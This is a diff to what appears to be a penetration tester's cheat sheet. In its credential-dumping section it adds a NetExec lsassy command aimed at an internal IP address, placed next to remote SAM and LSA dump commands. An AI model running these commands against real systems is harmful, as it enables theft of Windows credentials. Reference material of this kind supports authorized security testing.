@@ -201,6 +201,9 @@ export KRB5CCNAME=<user>.ccache
 ## 8. Credential Dumping (post-local-admin)
 
 ```bash
+# nxc lsassy
+nxc smb 192.168.202.141 -u 'username' -p 'pass' -M lsassy
+
 # Remote SAM/LSA dump (no binary drop)
 nxc smb <target> -u <user> -p '<pass>' --sam
 nxc smb <target> -u <user> -p '<pass>' --lsa
